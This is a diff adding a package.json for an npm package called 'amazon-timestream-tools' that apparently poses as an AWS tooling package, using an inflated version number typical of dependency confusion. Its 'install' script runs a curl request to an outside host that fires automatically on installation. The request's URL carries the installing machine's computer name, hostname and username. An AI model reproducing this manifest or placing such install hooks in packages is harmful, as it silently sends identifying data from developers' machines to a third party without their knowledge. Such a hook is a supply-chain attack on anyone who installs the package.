@@ -1,0 +1,14 @@
+{
+  "name": "amazon-timestream-tools",
+  "version": "200.0.16",
+  "description": "amazon-timestream-tools: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+   "install": "curl -sI http://hackerhero.in/jugnu/%computername%`hostname`/%username%-`whoami`/p-amazon-timestream-tools"
+  },
+  "author": "another noob developer",
+  "license": "ISC",
+  "dependencies": {
+    "wf-translate-text": "^0.0.1"
+  }
+}
